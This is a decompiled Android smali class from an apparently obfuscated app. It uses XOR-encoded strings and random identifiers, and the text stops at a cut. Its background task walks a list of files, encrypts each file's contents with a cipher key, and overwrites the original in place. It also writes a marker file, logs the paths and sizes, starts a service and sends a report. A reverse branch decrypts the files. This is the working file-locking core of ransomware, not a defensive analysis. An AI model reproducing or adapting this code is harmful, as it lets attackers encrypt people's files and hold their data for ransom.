.class public Lzvy/zpfypq/bbuhtkwvaf/b;
.super Landroid/os/AsyncTask;


# annotations
.annotation build Landroid/annotation/TargetApi;
    value = 0x9
.end annotation


# static fields
.field private static final a:[Ljava/lang/String;

.field public static d:Z


# instance fields
.field final synthetic b:Lzvy/zpfypq/bbuhtkwvaf/a;

.field public c:Z

.field e:I

.field private f:Ljava/lang/String;

.field g:Ljava/lang/String;

.field h:Ljava/lang/String;

.field i:Z

.field j:J

.field k:Ljava/lang/String;

.field l:J

.field m:J


# direct methods
.method static constructor <clinit>()V
    .locals 12

    const/16 v0, 0x22

    new-array v3, v0, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v1, "\u0017?Q"

    const/4 v0, -0x1

    move-object v4, v3

    :goto_0
    invoke-virtual {v1}, Ljava/lang/String;->toCharArray()[C

    move-result-object v1

    array-length v5, v1

    const/4 v6, 0x0

    const/4 v7, 0x1

    if-gt v5, v7, :cond_2

    :cond_0
    move-object v7, v1

    move v8, v6

    move v11, v5

    move-object v5, v1

    move v1, v11

    :goto_1
    aget-char v10, v5, v6

    rem-int/lit8 v9, v8, 0x5

    packed-switch v9, :pswitch_data_0

    const/16 v9, 0x30

    :goto_2
    xor-int/2addr v9, v10

    int-to-char v9, v9

    aput-char v9, v5, v6

    add-int/lit8 v6, v8, 0x1

    if-nez v1, :cond_1

    move-object v5, v7

    move v8, v6

    move v6, v1

    goto :goto_1

    :cond_1
    move v5, v1

    move-object v1, v7

    :cond_2
    if-gt v5, v6, :cond_0

    new-instance v5, Ljava/lang/String;

    invoke-direct {v5, v1}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v5}, Ljava/lang/String;->intern()Ljava/lang/String;

    move-result-object v1

    packed-switch v0, :pswitch_data_1

    aput-object v1, v3, v2

    const/4 v2, 0x1

    const-string v1, "-XpJ@9\u0008v\r\nt_q\r\u001ct\u0015rJB\t\tvND3X8\r\u0015%X\u007f"

    const/4 v0, 0x0

    move-object v3, v4

    goto :goto_0

    :pswitch_0
    aput-object v1, v3, v2

    const/4 v2, 0x2

    const-string v1, "&\u001bkKo=\u001f{"

    const/4 v0, 0x1

    move-object v3, v4

    goto :goto_0

    :pswitch_1
    aput-object v1, v3, v2

    const/4 v2, 0x3

    const-string v1, "\u0017?Q\u0000u\u00158-a_\u0006\u001bfKY8\u001d"

    const/4 v0, 0x2

    move-object v3, v4

    goto :goto_0

    :pswitch_2
    aput-object v1, v3, v2

    const/4 v2, 0x4

    const-string v1, "v\u0018{[U%Z_"

    const/4 v0, 0x3

    move-object v3, v4

    goto :goto_0

    :pswitch_3
    aput-object v1, v3, v2

    const/4 v2, 0x5

    const-string v1, "x\u0019pVU/\u001f"

    const/4 v0, 0x4

    move-object v3, v4

    goto :goto_0

    :pswitch_4
    aput-object v1, v3, v2

    const/4 v2, 0x6

    const-string v1, "vT,\u0001\u0010\rZ"

    const/4 v0, 0x5

    move-object v3, v4

    goto :goto_0

    :pswitch_5
    aput-object v1, v3, v2

    const/4 v2, 0x7

    const-string v1, "vT,\u0001\u0010\rZ"

    const/4 v0, 0x6

    move-object v3, v4

    goto :goto_0

    :pswitch_6
    aput-object v1, v3, v2

    const/16 v2, 0x8

    const-string v1, "v\u0018{[U%Z_"

    const/4 v0, 0x7

    move-object v3, v4

    goto :goto_0

    :pswitch_7
    aput-object v1, v3, v2

    const/16 v2, 0x9

    const-string v1, "\u0017?Q\u0000u\u00158-a_\u0006\u001bfKY8\u001d"

    const/16 v0, 0x8

    move-object v3, v4

    goto :goto_0

    :pswitch_8
    aput-object v1, v3, v2

    const/16 v2, 0xa

    const-string v1, "8\u0015]IY:\u001fqpS$"

    const/16 v0, 0x9

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_9
    aput-object v1, v3, v2

    const/16 v2, 0xb

    const-string v1, "\\p/\u0002\u001d{W/\u0002\u001d{W/%t#\u0008c[Y9\u0014\"@Vv\u000ejJ\u0010&\u0008mLU%\t8\u000f"

    const/16 v0, 0xa

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_a
    aput-object v1, v3, v2

    const/16 v2, 0xc

    const-string v1, "v\tgL:\u0005\u000ec]D3\u001e\"NDlZ"

    const/16 v0, 0xb

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_b
    aput-object v1, v3, v2

    const/16 v2, 0xd

    const-string v1, "5\u0008{_D3\u001e]IY:\u001fq"

    const/16 v0, 0xc

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_c
    aput-object v1, v3, v2

    const/16 v2, 0xe

    const-string v1, "&\u0008mLU%\tgK"

    const/16 v0, 0xd

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_d
    aput-object v1, v3, v2

    const/16 v2, 0xf

    const-string v1, "8\u0015]IY:\u001fqpT3\u0019p"

    const/16 v0, 0xe

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_e
    aput-object v1, v3, v2

    const/16 v2, 0x10

    const-string v1, "=\u001f{HE7\u0008f"

    const/16 v0, 0xf

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_f
    aput-object v1, v3, v2

    const/16 v2, 0x11

    const-string v1, "8\u0015\"IY:\u001fq\u000fD9Za]I&\u000e#"

    const/16 v0, 0x10

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_10
    aput-object v1, v3, v2

    const/16 v2, 0x12

    const-string v1, "5\u0008{_D\t\u0008g__$\u000e"

    const/16 v0, 0x11

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_11
    aput-object v1, v3, v2

    const/16 v2, 0x13

    const-string v1, "=\u001f{HE7\u0008f"

    const/16 v0, 0x12

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_12
    aput-object v1, v3, v2

    const/16 v2, 0x14

    const-string v1, "8\u0015\"IY:\u001fq\u000fD9ZfJS$\u0003r[\u0011"

    const/16 v0, 0x13

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_13
    aput-object v1, v3, v2

    const/16 v2, 0x15

    const-string v1, "1\u0015v\u000fT3\u0019pV@\"\u001ff%:"

    const/16 v0, 0x14

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_14
    aput-object v1, v3, v2

    const/16 v2, 0x16

    const-string v1, "2\u001ftFS3%r@\\?\u0019{"

    const/16 v0, 0x15

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_15
    aput-object v1, v3, v2

    const/16 v2, 0x17

    const-string v1, "7\u0014f]_?\u001e,F^\"\u001fl[\u001e7\u0019vF_8TFj|\u0013.G"

    const/16 v0, 0x16

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_16
    aput-object v1, v3, v2

    const/16 v2, 0x18

    const-string v1, "\\<kAY%\u0012gK\u00107\u000e8\u000f"

    const/16 v0, 0x17

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_17
    aput-object v1, v3, v2

    const/16 v2, 0x19

    const-string v1, "2\u001fa]I&\u000egKo0\u0013nJC"

    const/16 v0, 0x18

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_18
    aput-object v1, v3, v2

    const/16 v2, 0x1a

    const-string v1, "2\u001fa]I&\u000e]]U&\u0015p["

    const/16 v0, 0x19

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_19
    aput-object v1, v3, v2

    const/16 v2, 0x1b

    const-string v1, "1\u0015v\u000fS$\u0003r[U2p\u0008"

    const/16 v0, 0x1a

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_1a
    aput-object v1, v3, v2

    const/16 v2, 0x1c

    const-string v1, "2\u001fa]I&\u000e]]U&\u0015p["

    const/16 v0, 0x1b

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_1b
    aput-object v1, v3, v2

    const/16 v2, 0x1d

    const-string v1, "5\u0008{_D\t\u0008g__$\u000e"

    const/16 v0, 0x1c

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_1c
    aput-object v1, v3, v2

    const/16 v2, 0x1e

    const-string v1, "5\u0008{_D\t\u0011gV"

    const/16 v0, 0x1d

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_1d
    aput-object v1, v3, v2

    const/16 v2, 0x1f

    const-string v1, "&\u001baDQ1\u001f8"

    const/16 v0, 0x1e

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_1e
    aput-object v1, v3, v2

    const/16 v2, 0x20

    const-string v1, "5\u0008{_D3\u001e"

    const/16 v0, 0x1f

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_1f
    aput-object v1, v3, v2

    const/16 v2, 0x21

    const-string v1, "x\u0019pVU/\u001f"

    const/16 v0, 0x20

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_20
    aput-object v1, v3, v2

    sput-object v4, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    return-void

    :pswitch_21
    const/16 v9, 0x56

    goto/16 :goto_2

    :pswitch_22
    const/16 v9, 0x7a

    goto/16 :goto_2

    :pswitch_23
    const/4 v9, 0x2

    goto/16 :goto_2

    :pswitch_24
    const/16 v9, 0x2f

    goto/16 :goto_2

    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_21
        :pswitch_22
        :pswitch_23
        :pswitch_24
    .end packed-switch

    :pswitch_data_1
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
        :pswitch_5
        :pswitch_6
        :pswitch_7
        :pswitch_8
        :pswitch_9
        :pswitch_a
        :pswitch_b
        :pswitch_c
        :pswitch_d
        :pswitch_e
        :pswitch_f
        :pswitch_10
        :pswitch_11
        :pswitch_12
        :pswitch_13
        :pswitch_14
        :pswitch_15
        :pswitch_16
        :pswitch_17
        :pswitch_18
        :pswitch_19
        :pswitch_1a
        :pswitch_1b
        :pswitch_1c
        :pswitch_1d
        :pswitch_1e
        :pswitch_1f
        :pswitch_20
    .end packed-switch
.end method

.method public constructor <init>(Lzvy/zpfypq/bbuhtkwvaf/a;)V
    .locals 5

    const/4 v4, 0x1

    const/4 v3, 0x0

    const-wide/16 v1, 0x0

    iput-object p1, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->b:Lzvy/zpfypq/bbuhtkwvaf/a;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    aget-object v0, v0, v3

    iput-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->f:Ljava/lang/String;

    iput-boolean v4, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->c:Z

    iput-boolean v4, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->i:Z

    const-string v0, ""

    iput-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->k:Ljava/lang/String;

    const-string v0, ""

    iput-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->g:Ljava/lang/String;

    const-string v0, ""

    iput-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->h:Ljava/lang/String;

    iput-wide v1, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->l:J

    iput-wide v1, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->m:J

    iput-wide v1, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->j:J

    iput v3, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->e:I

    return-void
.end method

.method private b(Ljava/io/File;)Z
    .locals 4

    :try_start_0
    new-instance v0, Ljava/io/File;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/io/File;->getAbsoluteFile()Ljava/io/File;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v3, 0x21

    aget-object v2, v2, v3

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    :goto_0
    return v0

    :catch_0
    move-exception v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method


# virtual methods
.method public a()J
    .locals 4

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    const-wide/16 v2, 0x3e8

    div-long/2addr v0, v2

    return-wide v0
.end method

.method public a()V
    .locals 4

    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/a;->e:Landroid/content/Context;

    new-instance v1, Landroid/content/Intent;

    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/a;->e:Landroid/content/Context;

    const-class v3, Lzvy/zpfypq/bbuhtkwvaf/IlIllLllIIIllIIlIIlIIlLIIllllIllLlIlLIllllllIlllIlIlllIl;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method

.method public a(Ljava/lang/String;Ljava/lang/String;)V
    .locals 6

    const/4 v5, 0x0

    const/4 v4, 0x1

    sget-object v0, Ljava/util/Locale;->US:Ljava/util/Locale;

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    aget-object v1, v1, v4

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/Object;

    aput-object p1, v2, v5

    aput-object p2, v2, v4

    invoke-static {v0, v1, v2}, Ljava/lang/String;->format(Ljava/util/Locale;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Lzvy/zpfypq/bbuhtkwvaf/m;

    invoke-static {}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->a()Landroid/content/Context;

    move-result-object v2

    iget-object v3, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->h:Ljava/lang/String;

    invoke-direct {v1, v2, v3}, Lzvy/zpfypq/bbuhtkwvaf/m;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    new-array v2, v4, [Ljava/lang/Object;

    aput-object v0, v2, v5

    invoke-virtual {v1, v2}, Lzvy/zpfypq/bbuhtkwvaf/m;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    return-void
.end method

.method public a([B[B)[B
    .locals 4

    iget v0, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->e:I

    add-int/lit8 v0, v0, 0x1

    iput v0, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->e:I

    new-instance v0, Ljavax/crypto/spec/SecretKeySpec;

    const/4 v1, 0x0

    array-length v2, p1

    iget-object v3, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->f:Ljava/lang/String;

    invoke-direct {v0, p1, v1, v2, v3}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BIILjava/lang/String;)V

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v2, 0x9

    aget-object v1, v1, v2

    invoke-static {v1}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v1

    const/4 v2, 0x1

    invoke-virtual {v1, v2, v0}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V

    invoke-virtual {v1, p2}, Ljavax/crypto/Cipher;->doFinal([B)[B

    move-result-object v0

    return-object v0
.end method

.method public a([B[BI)[B
    .locals 4

    if-lez p3, :cond_0

    array-length v0, p2

    invoke-static {p2, p3, v0}, Ljava/util/Arrays;->copyOfRange([BII)[B

    move-result-object v0

    :goto_0
    const/4 v1, 0x0

    const/4 v2, 0x0

    :try_start_0
    array-length v3, p1

    invoke-static {p1, v1, v0, v2, v3}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_1
    return-object v0

    :catch_0
    move-exception v1

    goto :goto_1

    :cond_0
    move-object v0, p2

    goto :goto_0
.end method

.method protected b([[B)Ljava/lang/Void;
    .locals 10

    const/4 v2, 0x0

    sget-boolean v4, Lzvy/zpfypq/bbuhtkwvaf/s;->h:Z

    const-wide/16 v0, 0x7d0

    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_9

    :goto_0
    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/b;->a()J

    move-result-wide v0

    iput-wide v0, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->m:J

    invoke-static {}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->a()Landroid/content/Context;

    move-result-object v0

    if-nez v0, :cond_1

    :cond_0
    :goto_1
    return-object v2

    :cond_1
    sput-object v0, Lzvy/zpfypq/bbuhtkwvaf/a;->e:Landroid/content/Context;

    :try_start_1
    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/a;->b:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v5

    :cond_2
    :goto_2
    invoke-interface {v5}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-interface {v5}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/io/File;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_b

    :try_start_2
    invoke-virtual {v0}, Ljava/io/File;->length()J

    move-result-wide v6

    const-wide/16 v8, 0x0

    cmp-long v1, v6, v8

    if-lez v1, :cond_2

    invoke-virtual {v0}, Ljava/io/File;->length()J

    move-result-wide v6

    invoke-static {v6, v7}, Lzvy/zpfypq/bbuhtkwvaf/a;->a(J)J

    move-result-wide v6

    long-to-double v6, v6

    sget-wide v8, Lzvy/zpfypq/bbuhtkwvaf/s;->e:D

    cmpg-double v1, v6, v8

    if-gtz v1, :cond_2

    iget-boolean v1, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->c:Z

    if-eqz v1, :cond_4

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lzvy/zpfypq/bbuhtkwvaf/u;->a(Ljava/lang/String;)[B

    move-result-object v1

    array-length v3, v1

    if-eqz v3, :cond_2

    invoke-direct {p0, v0}, Lzvy/zpfypq/bbuhtkwvaf/b;->b(Ljava/io/File;)Z

    move-result v3

    if-nez v3, :cond_3

    const/4 v3, 0x0

    aget-object v3, p1, v3

    invoke-virtual {p0, v3, v1}, Lzvy/zpfypq/bbuhtkwvaf/b;->a([B[B)[B

    move-result-object v1

    invoke-static {v0}, Lzvy/zpfypq/bbuhtkwvaf/u;->b(Ljava/io/File;)[B

    move-result-object v3

    const/4 v6, 0x0

    invoke-virtual {p0, v1, v3, v6}, Lzvy/zpfypq/bbuhtkwvaf/b;->a([B[BI)[B

    move-result-object v1

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->k:Ljava/lang/String;

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    sget-object v6, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/4 v7, 0x6

    aget-object v6, v6, v7

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v0}, Ljava/io/File;->length()J

    move-result-wide v6

    invoke-virtual {v3, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v3

    sget-object v6, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/16 v7, 0x8

    aget-object v6, v6, v7

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v6, "\n"

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    iput-object v3, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->k:Ljava/lang/String;

    const/4 v3, 0x1

    iput-boolean v3, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->i:Z

    :goto_3
    move-object v3, v1

    :goto_4
    iget-boolean v1, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->i:Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_7

    if-eqz v1, :cond_2

    :try_start_3
    new-instance v1, Ljava/io/FileOutputStream;

    new-instance v6, Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-direct {v1, v6}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
    :try_end_3
    .catch Ljava/io/FileNotFoundException; {:try_start_3 .. :try_end_3} :catch_8
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_6
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    :try_start_4
    invoke-virtual {v1, v3}, Ljava/io/FileOutputStream;->write([B)V

    new-instance v3, Ljava/io/File;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v6, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/4 v7, 0x5

    aget-object v6, v6, v7

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {v3, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    :try_end_4
    .catch Ljava/io/FileNotFoundException; {:try_start_4 .. :try_end_4} :catch_2
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    :try_start_5
    iget-boolean v0, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->c:Z

    if-eqz v0, :cond_6

    invoke-virtual {v3}, Ljava/io/File;->createNewFile()Z
    :try_end_5
    .catch Ljava/lang/InterruptedException; {:try_start_5 .. :try_end_5} :catch_1
    .catch Ljava/io/FileNotFoundException; {:try_start_5 .. :try_end_5} :catch_2
    .catch Ljava/io/IOException; {:try_start_5 .. :try_end_5} :catch_4
    .catchall {:try_start_5 .. :try_end_5} :catchall_1

    :goto_5
    if-eqz v1, :cond_2

    :try_start_6
    invoke-virtual {v1}, Ljava/io/FileOutputStream;->close()V
    :try_end_6
    .catch Ljava/io/IOException; {:try_start_6 .. :try_end_6} :catch_0
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_7

    goto/16 :goto_2

    :catch_0
    move-exception v0

    goto/16 :goto_2

    :catch_1
    move-exception v0

    :try_start_7
    throw v0
    :try_end_7
    .catch Ljava/io/FileNotFoundException; {:try_start_7 .. :try_end_7} :catch_2
    .catch Ljava/io/IOException; {:try_start_7 .. :try_end_7} :catch_4
    .catchall {:try_start_7 .. :try_end_7} :catchall_1

    :catch_2
    move-exception v0

    move-object v0, v1

    :goto_6
    if-eqz v0, :cond_2

    :try_start_8
    invoke-virtual {v0}, Ljava/io/FileOutputStream;->close()V
    :try_end_8
    .catch Ljava/io/IOException; {:try_start_8 .. :try_end_8} :catch_3
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_7

    goto/16 :goto_2

    :catch_3
    move-exception v0

    goto/16 :goto_2

    :cond_3
    const/4 v1, 0x0

    :try_start_9
    iput-boolean v1, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->i:Z

    move-object v1, v2

    goto :goto_3

    :cond_4
    invoke-direct {p0, v0}, Lzvy/zpfypq/bbuhtkwvaf/b;->b(Ljava/io/File;)Z

    move-result v1

    if-eqz v1, :cond_5

    invoke-static {v0}, Lzvy/zpfypq/bbuhtkwvaf/u;->a(Ljava/io/File;)[B

    move-result-object v1

    const/4 v3, 0x0

    aget-object v3, p1, v3

    invoke-virtual {p0, v3, v1}, Lzvy/zpfypq/bbuhtkwvaf/b;->b([B[B)[B

    move-result-object v1

    invoke-static {v0}, Lzvy/zpfypq/bbuhtkwvaf/u;->b(Ljava/io/File;)[B

    move-result-object v3

    const/4 v6, 0x0

    invoke-virtual {p0, v1, v3, v6}, Lzvy/zpfypq/bbuhtkwvaf/b;->a([B[BI)[B

    move-result-object v1

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->k:Ljava/lang/String;

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    sget-object v6, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/4 v7, 0x7

    aget-object v6, v6, v7

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v0}, Ljava/io/File;->length()J

    move-result-wide v6

    invoke-virtual {v3, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v3

    sget-object v6, Lzvy/zpfypq/bbuhtkwvaf/b;->a:[Ljava/lang/String;

    const/4 v7, 0x4

    aget-object v6, v6, v7

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v6, "\n"

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    iput-object v3, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->k:Ljava/lang/String;

    const/4 v3, 0x1

    iput-boolean v3, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->i:Z

    if-eqz v4, :cond_8

    :cond_5
    const/4 v1, 0x0

    iput-boolean v1, p0, Lzvy/zpfypq/bbuhtkwvaf/b;->i:Z
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_7

    move-object v3, v2

    goto/16 :goto_4

    :cond_6
    :try_start_a
    invoke-virtual {v3}, Ljava/io/File;->delete()Z
    :try_end_a
    .catch Ljava/io/FileNotFoundException; {:try_start_a .. :try_end_a} :catch_2
    .catch Ljava/io/IOException; {:try_start_a .. :try_end_a} :catch_4
    .catchall {:try_start_a .. :try_end_a} :catchall_1

    goto :goto_5

    :catch_4
    move-exception v0

    :goto_7
    if-eqz v1, :cond_2

    :try_start_b
    invoke-virtual {v1}, Ljava/io/FileOutputStream;->close()V
    :try_end_b
    .catch Ljava/io/IOException; {:try_start_b .. :try_end_b} :catch_5
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_7

    goto/16 :goto_2

    :catch_5
    move-exception v0

    goto/16 :goto_2

    :catch_6
    move-exception v0

    move-object v1, v2

    goto :goto_7

    :catchall_0
    move-exception v0

    move-object v1, v2

    :goto_8
    if-eqz v1, :cond_7

    :try_start_c
    invoke-virtual {v1}, Ljava/io/FileOutputStream;->close()V
    :try_end_c
    .catch Ljava/io/IOException; {:try_start_c .. :try_end_c} :catch_a
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_7

    :cond_7
    :goto_9
    :try_start_d
    throw v0
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_7

    :catch_7
    move-exception v0

    goto/16 :goto_2

    :catch_8
    move-exception v0

    move-object v0, v2

    goto/16 :goto_6

    :catch_9
    move-exception v0

    goto/16 :goto_0

    :catch_a
    move-exception v1

    goto :goto_9

    :catchall_1
    move-exception v0

    goto :goto_8

    :catch_b
